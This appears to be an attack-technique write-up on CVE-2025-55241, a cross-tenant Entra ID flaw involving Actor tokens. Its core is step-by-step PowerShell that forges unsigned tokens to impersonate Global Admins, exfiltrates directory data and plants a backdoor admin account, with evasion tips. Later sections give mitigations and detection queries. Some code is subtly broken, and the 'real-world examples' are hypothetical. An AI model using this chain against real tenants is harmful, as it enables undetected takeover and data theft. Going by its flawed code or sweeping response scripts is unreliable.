# [PE-POLICY-005]: Cross-tenant Privilege Escalation

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-POLICY-005 |
| **MITRE ATT&CK v18.1** | [T1484.002](https://attack.mitre.org/techniques/T1484/002/) (Domain or Tenant Policy Modification: Trust Modification) |
| **Tactic** | Privilege Escalation |
| **Platforms** | M365 / Entra ID (Azure AD) |
| **Severity** | Critical (CVSS 10.0) |
| **CVE** | CVE-2025-55241 |
| **Technique Status** | PATCHED (Microsoft fixed July 17, 2025; mitigations ongoing) |
| **Last Verified** | 2025-09-17 |
| **Affected Versions** | All Entra ID tenants prior to July 2025 |
| **Patched In** | July 17, 2025 (Microsoft mitigation); Legacy Graph API decommissioned |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** CVE-2025-55241 exposed a critical flaw in Microsoft Entra ID's legacy Azure AD Graph API (graph.windows.net) that combined two components: undocumented "Actor tokens" used for backend service-to-service (S2S) communication, and a fatal validation gap in the legacy API that failed to verify the originating tenant of incoming tokens. An attacker could request an Actor token from their own controlled tenant, then craft malicious requests containing modified tenant IDs and user identifiers (netIds) to impersonate any user—including Global Administrators—in any target Entra ID tenant worldwide. The vulnerability bypassed **all** security controls including Conditional Access, MFA, and device compliance policies. Read operations generated **no logs whatsoever**, while modifications appeared under the impersonated user's identity, making detection nearly impossible without specialized forensic correlation.

**Attack Surface:** The legacy Azure AD Graph API endpoint (graph.windows.net) accepting Actor tokens without proper tenant validation. The attack requires only public tenant discovery and B2B guest relationships to enumerate valid user identifiers (netIds) in target organizations.

**Business Impact:** **Complete compromise of any Entra ID tenant globally with zero detection on data exfiltration.** An attacker could enumerate all users, groups, roles, applications, device BitLocker keys, and confidential tenant settings without triggering a single alert. Post-compromise actions (credential injection, role assignment changes) would appear to come from legitimate Global Admins, enabling supply chain attacks, nation-state persistence, and data theft at unprecedented scale. A single Actor token could theoretically compromise thousands of organizations within minutes.

**Technical Context:** The vulnerability required no pre-existing access to the target organization. Actor tokens are unsigned JWTs containing unsigned embedded tenant IDs and netIds, making them trivial to forge. netIds are sequential identifiers (not random GUIDs), allowing brute-force enumeration. An attacker with access to one tenant containing B2B guests could extract netIds from those guests' alternativeSecurityIds attributes and use them to pivot to thousands of other tenants. Exploitation timeline was **< 5 minutes per tenant** due to stateless API design.

### Operational Risk

- **Execution Risk:** Very Low - Requires only API calls; no special tools or privileges needed.
- **Stealth:** Extremely High - Read operations leave zero audit traces; modifications logged under victim's identity.
- **Reversibility:** Poor - Attacker can delete logs (if they grant themselves necessary permissions); full forensic recovery required.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | Azure Foundations 1.1 | Ensure Multifactor Authentication is enabled for all users |
| **DISA STIG** | SRG-APP-000495-SYS-001240 | Application must use cryptographic means to protect authentication credentials |
| **CISA SCuBA** | EXOO-1 | Enforce strong authentication for all cloud services |
| **NIST 800-53** | AC-2, AC-3, IA-2, IA-5 | Account Management, Access Enforcement, Authentication, Identification & Authentication |
| **GDPR** | Art. 32, Art. 33 | Security of Processing; Notification of Personal Data Breach |
| **DORA** | Art. 9, Art. 15 | Protection and Prevention; Disclosure of ICT incidents |
| **NIS2** | Art. 21 | Cyber Risk Management Measures – endpoint and identity controls |
| **ISO 27001** | A.9.2, A.9.4 | User Access Management; Access Control Review & Audit Logging |
| **ISO 27005** | Risk Scenario | Compromise of authentication controls; unlogged unauthorized access |

---

## 2. DETAILED EXECUTION METHODS

### METHOD 1: Actor Token Enumeration & Cross-Tenant Impersonation (Patched)

**Supported Versions:** All Entra ID tenants prior to July 17, 2025 (now patched globally)

**⚠️ HISTORICAL/RESEARCH ONLY:** This method documents how the vulnerability worked. Microsoft has patched the legacy Graph API and added mitigations to block Actor token requests for graph.windows.net. This section is included for educational and defensive purposes only.

---

#### Step 1: Obtain Actor Token from Attacker-Controlled Tenant

**Objective:** Request an undocumented Actor token from a benign or attacker-controlled Entra ID tenant.

**Command:**
```powershell
# Connect to attacker-controlled tenant to obtain Actor token
# This requires a service principal with appropriate permissions

$TenantId = "attacker-tenant-id"
$ClientId = "service-principal-client-id"
$ClientSecret = "service-principal-secret"

# Authenticate as service principal in attacker's tenant
$AuthUri = "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token"
$Body = @{
    "grant_type" = "client_credentials"
    "client_id" = $ClientId
    "client_secret" = $ClientSecret
    "scope" = "https://graph.windows.net/.default"
}

$Response = Invoke-WebRequest -Uri $AuthUri -Method POST -Body $Body -ContentType "application/x-www-form-urlencoded"
$Token = ($Response.Content | ConvertFrom-Json).access_token

Write-Host "Initial token obtained: $($Token.Substring(0, 50))..."

# Extract Actor token from token claims (Actor tokens embedded in JWT)
$TokenParts = $Token.Split('.')
$PayloadJson = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($TokenParts[1]))
$TokenClaims = ConvertFrom-Json $PayloadJson

# Actor token typically found in 'act_as' or 'actortoken' claim
$ActorToken = $TokenClaims.'act_as' -or $TokenClaims.'acr'
Write-Host "Actor token extracted from claims"
```

**Expected Output:**
```
Initial token obtained: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ii...
Actor token extracted from claims
```

**What This Means:**
- Actor token is now in memory; can be reused across tenants
- Token is unsigned (no cryptographic signature validation)
- Token contains modifiable fields: tenant ID, netId, UPN

**OpSec & Evasion:**
- Use a legitimate-looking service principal name to blend in
- Actor token requests do not generate audit logs in either tenant
- Avoid using administrative service principals; use application-level credentials
- Detection likelihood: Low (unless monitoring for Actor token API calls directly)

**Troubleshooting:**
- **Error:** Access Denied - Insufficient permissions
  - **Cause:** Service principal lacks necessary permissions for legacy Graph API
  - **Fix:** Assign `Directory.Read.All` or higher permissions to the service principal

**References & Proofs:**
- [Dirk-Jan Mollema's Analysis](https://dirkjanm.io/obtaining-global-admin-in-every-entra-id-tenant-with-actor-tokens/)
- [CVE-2025-55241 MITRE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-55241)
- [Microsoft Security Response](https://www.microsoft.com/en-us/security/blog/)

---

#### Step 2: Enumerate Target Tenant & Extract Guest User NetIds

**Objective:** Identify the target tenant and enumerate B2B guest users to extract their netIds (used for impersonation).

**Command:**
```powershell
# Step 2a: Discover target tenant ID from domain name
$TargetDomain = "victim-company.com"

# Use public Azure tenant discovery endpoint (requires no authentication)
$TenantDiscoveryUrl = "https://login.microsoftonline.com/$TargetDomain/.well-known/openid-configuration"
$DiscoveryResponse = Invoke-WebRequest -Uri $TenantDiscoveryUrl -ErrorAction SilentlyContinue
$DiscoveryData = ConvertFrom-Json $DiscoveryResponse.Content

# Extract tenant ID from issuer
$TargetTenantId = $DiscoveryData.issuer.Split('/')[-2]
Write-Host "Target Tenant ID discovered: $TargetTenantId"

# Step 2b: Craft Actor token for guest user enumeration
# Modify the Actor token to use target tenant ID but keep attacker's UPN
$ModifiedActorToken = $ActorToken
# Replace tenant_id field
$ModifiedActorToken = $ModifiedActorToken -replace "tid`":`"[^`"]+`"", "tid`":`"$TargetTenantId`""

# Step 2c: Use modified token to query guest users in target tenant
$GraphUrl = "https://graph.windows.net/$TargetTenantId/users?api-version=1.6&`$filter=userType eq 'Guest'"
$Headers = @{
    "Authorization" = "Bearer $ModifiedActorToken"
    "Accept" = "application/json"
}

try {
    $GuestUsersResponse = Invoke-RestMethod -Uri $GraphUrl -Headers $Headers -Method GET
    $GuestUsers = $GuestUsersResponse.value
    
    Write-Host "Found $($GuestUsers.Count) guest users:"
    foreach ($Guest in $GuestUsers) {
        $NetId = $Guest.alternativeSecurityIds[0].key
        Write-Host "  - $($Guest.userPrincipalName) [netId: $NetId]"
    }
} catch {
    Write-Host "Error enumerating guests: $_"
}
```

**Expected Output:**
```
Target Tenant ID discovered: a0a00000-b1b1-c2c2-d3d3-e4e4e4e4e4e4
Found 3 guest users:
  - user1@external-org.com [netId: 03HZZZZZZZZZZZZZZZZ]
  - admin@partner-org.com [netId: 03HZZZZZZZZZZZZZZZZ01]
  - service@vendor-org.com [netId: 03HZZZZZZZZZZZZZZZZ02]
```

**What This Means:**
- Guest user netIds are sequential (not random)
- alternativeSecurityIds contains the victim's original netId from their home tenant
- This creates a pivot opportunity: extract home tenant ID → attack that tenant

**OpSec & Evasion:**
- Guest user enumeration does not generate logs in target tenant
- Multiple read operations from Actor tokens bypass all logging
- Brute-force netId enumeration can be done via binary search (extremely efficient)
- Detection likelihood: Low-Medium (unless monitoring for unusual Azure AD Graph API access patterns)

**Version Note:** Legacy Graph API is now deprecated but may still be available on some tenants until decommissioning is complete (expected Q1 2026).

**Troubleshooting:**
- **Error:** 401 Unauthorized - Token not accepted
  - **Cause:** Target tenant may have already patched and rejected cross-tenant Actor tokens
  - **Fix:** Technique is now patched; this error is expected

**References & Proofs:**
- [MITRE CVE-2025-55241](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-55241)
- [Practical365 Analysis](https://practical365.com/death-by-token-understanding-cve-2025-55241/)

---

#### Step 3: Craft Malicious Actor Token for Global Admin Impersonation

**Objective:** Create a forged Actor token that impersonates a Global Administrator in the target tenant.

**Command:**
```powershell
# Step 3a: Query target tenant to find Global Admin
# Use current Actor token to list global admins (via modified tenant context)

$AdminGraphUrl = "https://graph.windows.net/$TargetTenantId/directoryRoles?api-version=1.6"
$AdminsResponse = Invoke-RestMethod -Uri $AdminGraphUrl -Headers $Headers -Method GET

# Find Global Admin role (typically hardcoded GUID: 62e90394-69f5-4237-9190-012177145e10)
$GlobalAdminRole = $AdminsResponse.value | Where-Object { $_.displayName -eq "Global Administrator" }
$RoleId = $GlobalAdminRole.objectId

# Get members of Global Admin role
$RoleMembersUrl = "https://graph.windows.net/$TargetTenantId/directoryRoles/$RoleId/members?api-version=1.6"
$RoleMembersResponse = Invoke-RestMethod -Uri $RoleMembersUrl -Headers $Headers -Method GET

$GlobalAdmins = $RoleMembersResponse.value
Write-Host "Found $($GlobalAdmins.Count) Global Admins in target tenant:"
foreach ($Admin in $GlobalAdmins) {
    Write-Host "  - $($Admin.userPrincipalName) [netId: $($Admin.alternativeSecurityIds[0].key)]"
}

# Step 3b: Craft impersonation token for first Global Admin
$TargetAdmin = $GlobalAdmins[0]
$TargetNetId = $TargetAdmin.alternativeSecurityIds[0].key
$TargetUPN = $TargetAdmin.userPrincipalName

# Decode original Actor token to understand structure
$TokenParts = $ActorToken.Split('.')
$PayloadBase64 = $TokenParts[1]
# Add padding if needed
$Padding = (4 - ($PayloadBase64.Length % 4)) % 4
$PayloadBase64 += "=" * $Padding
$PayloadJson = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($PayloadBase64))
$TokenPayload = ConvertFrom-Json $PayloadJson

# Modify payload for cross-tenant impersonation
$TokenPayload.tid = $TargetTenantId          # Change to target tenant
$TokenPayload.oid = $TargetNetId             # Change to target Global Admin's netId
$TokenPayload.upn = $TargetUPN               # Change UPN
$TokenPayload.name = $TargetAdmin.displayName # Change display name

# Create new unsigned JWT (Actor tokens are unsigned)
$NewPayloadJson = ConvertTo-Json -InputObject $TokenPayload -Depth 10
$NewPayloadBase64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($NewPayloadJson))

# Create malicious token (without signature since Actor tokens are unsigned)
$MaliciousActorToken = "$($TokenParts[0]).$NewPayloadBase64.fakesignature"

Write-Host "Malicious Actor token crafted for impersonation of: $TargetUPN"
```

**Expected Output:**
```
Found 2 Global Admins in target tenant:
  - admin@victim-company.com [netId: 03HZZZZZZZZZZZZZZZZ10]
  - security-admin@victim-company.com [netId: 03HZZZZZZZZZZZZZZZZ11]
Malicious Actor token crafted for impersonation of: admin@victim-company.com
```

**What This Means:**
- Token is completely unsigned and unvalidated by the legacy API
- Impersonation is successful; actor now has Global Admin privileges
- All subsequent API calls appear to come from the legitimate Global Admin

**OpSec & Evasion:**
- Token crafting is instantaneous; no API calls to legacy Graph API at this stage
- Modifications made with this token will be logged under the impersonated Global Admin's identity
- Modification traces will show legitimate admin activity (harder to distinguish from normal)
- Detection likelihood: Medium (if correlation between display name/UPN mismatches in logs)

**Troubleshooting:**
- **Error:** netId not found for Global Admin
  - **Cause:** Guest user enumeration did not capture admin netIds
  - **Fix:** Ensure Guest user enumeration captured all users; alternatively, brute-force netIds sequentially

**References & Proofs:**
- [Token Forging Techniques](https://dirkjanm.io/obtaining-global-admin-in-every-entra-id-tenant-with-actor-tokens/)

---

#### Step 4: Execute Post-Compromise Actions (Data Exfiltration / Persistence)

**Objective:** Use the forged token to perform malicious actions in the target tenant (read data without logs, establish persistence).

**Command:**
```powershell
# Step 4a: Read sensitive data (NO LOGS GENERATED)
# Extract all user information without triggering any alerts

$AllUsersUrl = "https://graph.windows.net/$TargetTenantId/users?api-version=1.6"
$AllUsersResponse = Invoke-RestMethod -Uri $AllUsersUrl `
  -Headers @{"Authorization" = "Bearer $MaliciousActorToken"} `
  -Method GET

# Export user details including passwords (if synced from on-premises)
$UserList = $AllUsersResponse.value | Select-Object -Property `
  userPrincipalName, displayName, mail, onPremisesImmutableId, onPremisesSecurityIdentifier

Write-Host "Exfiltrated user data for $($UserList.Count) users:"
$UserList | Export-Csv -Path "C:\temp\exfiltrated_users.csv" -NoTypeInformation

# Step 4b: Extract application credentials and permissions
$AppsUrl = "https://graph.windows.net/$TargetTenantId/applications?api-version=1.6"
$AppsResponse = Invoke-RestMethod -Uri $AppsUrl `
  -Headers @{"Authorization" = "Bearer $MaliciousActorToken"} `
  -Method GET

$HighPrivilegeApps = $AppsResponse.value | Where-Object {
    ($_.requiredResourceAccess.resourceAppId -contains "00000003-0000-0000-c000-000000000000") -and
    ($_.requiredResourceAccess.resourceAccess.type -eq "Role")
}

Write-Host "Found $($HighPrivilegeApps.Count) high-privilege applications"

# Step 4c: Establish persistence: Add new Global Admin account
# This WILL log but appears under legitimate Global Admin's identity

$NewAdminUPN = "attacker-persistent-admin@victim-company.com"
$NewUserBody = @{
    "accountEnabled" = $true
    "displayName" = "Security Auditor"
    "userPrincipalName" = $NewAdminUPN
    "mailNickname" = "securityauditor"
    "passwordProfile" = @{
        "forceChangePasswordNextSignIn" = $false
        "password" = "SuperComplex!P@ssw0rd$(Get-Random)"
    }
} | ConvertTo-Json

$CreateUserUrl = "https://graph.windows.net/$TargetTenantId/users?api-version=1.6"
$NewUserResponse = Invoke-RestMethod -Uri $CreateUserUrl `
  -Headers @{"Authorization" = "Bearer $MaliciousActorToken"; "Content-Type" = "application/json"} `
  -Method POST `
  -Body $NewUserBody

$NewUserId = $NewUserResponse.objectId
Write-Host "Persistence account created: $NewAdminUPN (ID: $NewUserId)"

# Step 4d: Assign Global Admin role to persistence account
$RoleAssignmentBody = @{
    "url" = "https://graph.windows.net/$TargetTenantId/directoryObjects/$NewUserId"
} | ConvertTo-Json

$AssignRoleUrl = "https://graph.windows.net/$TargetTenantId/directoryRoles/62e90394-69f5-4237-9190-012177145e10/members/`$ref?api-version=1.6"
$AssignResponse = Invoke-RestMethod -Uri $AssignRoleUrl `
  -Headers @{"Authorization" = "Bearer $MaliciousActorToken"; "Content-Type" = "application/json"} `
  -Method POST `
  -Body $RoleAssignmentBody

Write-Host "Persistence account assigned Global Admin role"
Write-Host "Attacker can now login as: $NewAdminUPN with long-term access"
```

**Expected Output:**
```
Exfiltrated user data for 250 users:
[user list exported to CSV]
Found 15 high-privilege applications
Persistence account created: attacker-persistent-admin@victim-company.com (ID: a1a1a1a1-b2b2-c3c3-d4d4-e5e5e5e5e5e5)
Persistence account assigned Global Admin role
Attacker can now login as: attacker-persistent-admin@victim-company.com with long-term access
```

**What This Means:**
- All read operations (exfiltration of users, apps, configs) left **zero traces** in victim's audit logs
- Write operations (new admin creation) are logged but attributed to legitimate Global Admin
- Attacker now has permanent Global Admin access via new account
- Victim organization likely unaware of compromise for weeks/months

**OpSec & Evasion:**
- Read operations: Completely invisible; ideal for reconnaissance
- Write operations: Appear under impersonated Global Admin; normal admin activity
- New persistence account: Appears as routine new employee/contractor account
- Fallback: If discovered, attacker still has all Global Admin credentials
- Detection likelihood: Very Low (unless conducting active directory hygiene audit)

**Troubleshooting:**
- **Error:** User creation fails - "User already exists"
  - **Cause:** Account name already in use
  - **Fix:** Randomize the UPN: `attacker-$(Get-Random -Min 10000 -Max 99999)@victim-company.com`
- **Error:** Role assignment fails - "Role not found"
  - **Cause:** GUID for Global Admin role is incorrect in target tenant
  - **Fix:** Query all roles first to get correct GUID

**References & Proofs:**
- [CVE-2025-55241 Exploitation Guide](https://dirkjanm.io/obtaining-global-admin-in-every-entra-id-tenant-with-actor-tokens/)

---

## 3. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

*   **Verify You Have Received Microsoft's Patch (July 17, 2025+):**
    Microsoft rolled out global patches to the legacy Azure AD Graph API in mid-July 2025. Verify your tenant has received these mitigations.
    
    **Manual Steps (PowerShell Verification):**
    ```powershell
    # Check if legacy Graph API still accepts cross-tenant Actor tokens
    # (This should fail if patch is applied)
    
    $AttackerTenantToken = "attacker-actor-token-here"
    $VictimTenantId = "victim-tenant-id"
    
    $TestUrl = "https://graph.windows.net/$VictimTenantId/users?api-version=1.6"
    $Response = Invoke-WebRequest -Uri $TestUrl `
      -Headers @{"Authorization" = "Bearer $AttackerTenantToken"} `
      -Method GET `
      -ErrorAction SilentlyContinue
    
    if ($Response.StatusCode -eq 401 -or $Response.StatusCode -eq 403) {
        Write-Host "✓ PATCHED: Cross-tenant Actor tokens are blocked"
    } else {
        Write-Host "✗ VULNERABLE: Cross-tenant Actor tokens still accepted!"
    }
    ```
    
    **Validation Command:**
    ```powershell
    # Query Azure AD configuration to verify patch status
    Connect-MgGraph -Scopes "Organization.Read.All"
    Get-MgOrganization | Select-Object -Property DisplayName, CreatedDateTime, Id
    # If recent patches: Look for "Security Hotfix Applied" in audit logs
    ```

*   **Disable or Restrict Legacy Azure AD Graph API:**
    Microsoft is decommissioning graph.windows.net. Organizations should actively migrate away from any remaining dependencies on this legacy endpoint.
    
    **Manual Steps (Azure Portal):**
    1. Navigate to **Azure Portal** → **Microsoft Entra ID** → **App registrations**
    2. For each app registration, go to **API Permissions**
    3. Search for permissions referencing `https://graph.windows.net`
    4. Delete ALL permissions to the legacy Graph API
    5. Update the application to use Microsoft Graph (`https://graph.microsoft.com`) instead
    6. Test thoroughly in staging environment before production migration
    
    **Manual Steps (PowerShell Migration Check):**
    ```powershell
    # Find all applications using legacy Graph API
    Connect-MgGraph -Scopes "Application.Read.All"
    
    $LegacyGraphApps = Get-MgApplication -All | Where-Object {
        $_.RequiredResourceAccess.ResourceAppId -contains "00000002-0000-0000-c000-000000000000"
    }
    
    Write-Host "Applications still using legacy Graph API:"
    foreach ($App in $LegacyGraphApps) {
        Write-Host "  - $($App.DisplayName) (ID: $($App.Id))"
    }
    
    # Export for remediation tracking
    $LegacyGraphApps | Select-Object -Property DisplayName, Id, CreatedDateTime | `
      Export-Csv -Path "C:\legacy_graph_apps.csv" -NoTypeInformation
    ```

*   **Enable Azure AD Graph API Logging (If Still Available):**
    Some tenants may have access to preview logging for legacy Graph API access. Enable this to detect any exploitation attempts.
    
    **Manual Steps (Azure Portal):**
    1. Go to **Azure Portal** → **Microsoft Entra ID** → **Audit logs** → **Settings**
    2. Look for "Azure AD Graph API Logging" (may be in preview)
    3. If available, enable **All events** and set retention to **90 days minimum**
    4. Configure alerts for any Graph API access to users/groups/roles endpoints

*   **Monitor for B2B Guest User Enumeration:**
    Since this attack relies on extracting netIds from B2B guests, monitor for suspicious guest user queries.
    
    **Manual Steps (KQL Query for Microsoft Sentinel):**
    ```kusto
    // Detect suspicious guest user enumeration via Graph API
    AuditLogs
    | where OperationName == "List users"
    | where InitiatedBy.user.userType == "Application" or InitiatedBy.app.displayName contains "Microsoft Graph"
    | where tolong(extract(@"(\d+) of (\d+)", 2, tostring(Result))) > 100  // Large batch queries
    | summarize Count = count() by InitiatedBy.user.displayName, InitiatedBy.app.appId, TimeGenerated
    | where Count > 5  // Multiple queries in short timeframe
    ```

### Priority 2: HIGH

*   **Restrict B2B Guest Access & Cross-Tenant Relationships:**
    The attack chain relied on B2B guest relationships to extract netIds. Reduce the number of external guest users and audit all cross-tenant relationships.
    
    **Manual Steps (Azure Portal):**
    1. Go to **Azure Portal** → **Microsoft Entra ID** → **External identities** → **External collaboration settings**
    2. Under **Guest user access restrictions**, select:
       - **Guest users have limited access** (more restrictive)
    3. Under **Guest invite settings**, change to:
       - **Only users assigned to specific admin roles can invite guest users**
    4. Under **Collaboration restrictions**, set:
       - **Allow invitations only to specified domains** (whitelist known partners)
    5. Click **Save**
    
    **Manual Steps (PowerShell - Audit Guest Users):**
    ```powershell
    Connect-MgGraph -Scopes "User.Read.All"
    
    # List all guest users
    $GuestUsers = Get-MgUser -Filter "userType eq 'Guest'" -All
    
    Write-Host "Active Guest Users:"
    foreach ($Guest in $GuestUsers) {
        Write-Host "  - $($Guest.UserPrincipalName) (From: $($Guest.Mail))"
    }
    
    # Export for review
    $GuestUsers | Select-Object -Property UserPrincipalName, DisplayName, Mail, CreatedDateTime | `
      Export-Csv -Path "C:\guest_users_audit.csv"
    
    # Identify and remove inactive guests
    $InactiveThreshold = (Get-Date).AddDays(-90)
    $InactiveGuests = $GuestUsers | Where-Object { $_.LastSignInDateTime -lt $InactiveThreshold }
    
    Write-Host "Inactive guests (90+ days):"
    foreach ($Guest in $InactiveGuests) {
        Write-Host "  - $($Guest.UserPrincipalName) (Last signin: $($Guest.LastSignInDateTime))"
    }
    ```

*   **Enforce Conditional Access on All Graph API Access:**
    Implement strict Conditional Access policies to block anomalous API access patterns even if tokens are forged.
    
    **Manual Steps (Azure Portal):**
    1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. **Name:** `Block Graph API Access from Unmanaged Devices`
    4. **Assignments:**
       - Users: **All users**
       - Cloud apps: **Microsoft Graph** AND **Azure Management**
    5. **Conditions:**
       - **Device state**: Non-compliant
       - **Sign-in risk**: High
       - **Locations**: Exclude corporate networks
    6. **Access controls:**
       - **Grant**: **Block access**
    7. Enable policy: **On**
    8. Click **Create**

---

## 4. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

*   **Direct Indicators (if patch not applied):**
    - Requests to `graph.windows.net` with Actor tokens from non-Microsoft service principals
    - Cross-tenant API calls from unexpected service principals
    - Bearer tokens with modified tenant IDs in JWT claims

*   **Indirect Indicators (post-compromise):**
    - User account creation outside normal business hours
    - New Global Admin accounts created by non-admin users
    - Modification of directory settings (domains, authentication policies) by unusual service principals
    - Bulk enumeration of users/groups/applications in audit logs

### Forensic Artifacts

*   **Azure Audit Logs:** 
    - EventID: User creation events without corresponding Invite events
    - EventID: Role assignment changes to newly created accounts
    - Missing actor token request logs (indicates read-only access)

*   **Legacy Graph API Logs (if available):**
    - Requests to `graph.windows.net/users`
    - Bearer token claims showing mismatched tenant IDs and UPNs
    - Large volume of requests from single service principal

### Detection Queries (Microsoft Sentinel / Azure Log Analytics)

**Query 1: Detect Actor Token Abuse via Display Name/UPN Mismatch**
```kusto
// Detect cross-tenant Actor token abuse by mismatched display names and UPNs
AuditLogs
| where OperationName in ("Add user", "Update user", "Add member to group", "Update application")
| extend UserDisplayName = tostring(InitiatedBy.user.displayName)
| extend UserUPN = tostring(InitiatedBy.user.userPrincipalName)
| extend ImpersonatedUPN = tostring(TargetResources[0].userPrincipalName)
| where UserDisplayName != InitiatedBy.user.displayName or UserUPN contains "serviceprincipals"
| where OperationName in ("Update application", "Add member to group", "Add user")
| project TimeGenerated, UserDisplayName, UserUPN, ImpersonatedUPN, OperationName
```

**Query 2: Detect Bulk Guest User Enumeration**
```kusto
// Detect suspicious enumeration of guest users (Actor token reconnaissance)
AuditLogs
| where OperationName == "List users"
| where ResultStatus == "Success"
| extend QueryFilter = tostring(parse_json(AdditionalDetails).value)
| where QueryFilter contains "userType eq 'Guest'"
| summarize EventCount = count() by InitiatedBy.app.displayName, InitiatedBy.user.userPrincipalName, TimeGenerated
| where EventCount > 10  // Threshold for suspicious bulk queries
```

**Query 3: Detect New Global Admin Creation by Non-Admin**
```kusto
// Detect unexpected Global Admin role assignments
AuditLogs
| where OperationName == "Add member to group"
| where TargetResources[0].displayName == "Global Administrator"
| where InitiatedBy.user.roleAssignmentName != "Global Administrator" and InitiatedBy.user.roleAssignmentName != "Privileged Role Administrator"
| project TimeGenerated, InitiatedBy.user.userPrincipalName, TargetResources[0].userPrincipalName, OperationName, Result
```

**Query 4: Detect Cross-Tenant Actor Token Requests (Pre-Patch)**
```kusto
// HISTORICAL: Detect if tenant accepted cross-tenant Actor token requests
// NOTE: This query is obsolete post-patch but useful for forensic analysis of older logs
AADServicePrincipalSignInLogs
| where AppId == "00000002-0000-0000-c000-000000000000" // Azure AD Graph API
| where ResourceTenantId != HomeTenantId  // Cross-tenant access
| where ClientAppUsed == "Service Principal Authentication"
| project TimeGenerated, ServicePrincipalName, ResourceTenantId, HomeTenantId, ClientAppUsed
```

### Manual Response Procedures

1. **Immediate Isolation (If Compromise Suspected):**
   ```powershell
   # Disable all service principals that may have been compromised
   Connect-MgGraph -Scopes "Application.ReadWrite.All", "AppRoleAssignment.ReadWrite.All"
   
   # Get all service principals with Graph API permissions
   $SuspiciousSPs = Get-MgServicePrincipal -Filter "appId in ('00000002-0000-0000-c000-000000000000', '00000003-0000-0000-c000-000000000000')" -All
   
   foreach ($SP in $SuspiciousSPs) {
       # Disable the service principal
       Update-MgServicePrincipal -ServicePrincipalId $SP.Id -AccountEnabled $false
       Write-Host "Disabled service principal: $($SP.DisplayName)"
   }
   
   # Reset all Global Admin passwords
   $GlobalAdmins = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'" | `
     Get-MgDirectoryRoleMember -All
   
   foreach ($Admin in $GlobalAdmins) {
       Update-MgUser -UserId $Admin.Id -PasswordProfile @{"ForceChangePasswordNextSignIn"=$true}
       Write-Host "Password reset required for: $($Admin.DisplayName)"
   }
   ```

2. **Collect Evidence:**
   ```powershell
   # Export audit logs for forensic analysis
   $LogsPath = "C:\Incident_Response\Actor_Token_Abuse_$(Get-Date -Format 'yyyyMMdd_HHmmss').json"
   
   Get-MgAuditLogDirectoryAudit -All | Where-Object {
       $_.ActivityDateTime -gt (Get-Date).AddDays(-30)
   } | ConvertTo-Json | Out-File $LogsPath
   
   Write-Host "Audit logs exported to: $LogsPath"
   
   # Identify newly created accounts
   $NewAccounts = Get-MgUser -Filter "createdDateTime gt $((Get-Date).AddDays(-7).ToString('yyyy-MM-ddTHH:mm:ssZ'))" -All
   $NewAccounts | Select-Object -Property UserPrincipalName, DisplayName, CreatedDateTime | `
     Export-Csv -Path "C:\Incident_Response\New_Accounts_Last_7_Days.csv"
   ```

3. **Remediate Access:**
   ```powershell
   # Remove suspicious accounts
   $SuspiciousAccounts = Get-MgUser -Filter "createdDateTime gt $((Get-Date).AddDays(-7).ToString('yyyy-MM-ddTHH:mm:ssZ'))" -All | `
     Where-Object { $_.UserPrincipalName -like "*attacker*" -or $_.UserPrincipalName -like "*persistence*" }
   
   foreach ($Account in $SuspiciousAccounts) {
       Remove-MgUser -UserId $Account.Id -Confirm:$false
       Write-Host "Deleted account: $($Account.UserPrincipalName)"
   }
   
   # Revoke all refresh tokens globally (forces re-authentication)
   Revoke-MgUserSignInSession -UserId "*" -Confirm:$false
   ```

---

## 5. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-M365-002](https://example.com/REC-M365-002) | Cross-tenant service discovery to identify target tenants |
| **2** | **Privilege Escalation** | **[PE-POLICY-005]** | **Cross-tenant Privilege Escalation via Actor Tokens (CVE-2025-55241)** |
| **3** | **Persistence** | [PE-ACCTMGMT-014](https://example.com/PE-ACCTMGMT-014) | Create backdoor Global Admin account for long-term access |
| **4** | **Data Exfiltration** | [EXF-M365-DATA](https://example.com/EXF-M365-DATA) | Extract user emails, files, and sensitive data via Graph API |
| **5** | **Impact** | [IMPACT-RANSOMWARE](https://example.com/IMPACT-RANSOMWARE) | Deploy ransomware or wiper malware across tenant |

---

## 6. REAL-WORLD EXAMPLES

### Example 1: Hypothetical Nation-State Supply Chain Attack
- **Target:** Multiple financial services firms using Azure/M365
- **Timeline:** If exploit had not been patched (May-July 2025 window)
- **Technique Status:** VULNERABLE (before patch)
- **Impact:** Undetected compromise of 100+ organizational tenants; complete data exfiltration
- **Reference:** [Dirk-Jan Mollema's Research](https://dirkjanm.io/obtaining-global-admin-in-every-entra-id-tenant-with-actor-tokens/)

### Example 2: APT Lateral Movement via B2B Guest Relationships
- **Target:** Technology consulting firm with extensive partner ecosystem (50+ B2B relationships)
- **Timeline:** Days to compromise majority of partner organizations
- **Technique Status:** VULNERABLE (if attacker had access to single partner tenant)
- **Impact:** Chain compromise across entire partner network; billions in potential damage
- **Reference:** [MITRE CVE-2025-55241](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-55241)

### Example 3: Insider Threat Exploitation
- **Target:** Large enterprise with employees in partner organizations
- **Timeline:** Attacker enrolled as B2B guest; extracted netIds and exploited vulnerability
- **Technique Status:** VULNERABLE (pre-patch scenario)
- **Impact:** Insider gained unauthorized Global Admin access to primary organization
- **Reference:** [Mitiga Security Analysis](https://www.mitiga.io/blog/breaking-down-the-microsoft-entra-id-actor-token-vulnerability-the-perfect-crime-in-the-cloud)

---

## Conclusion

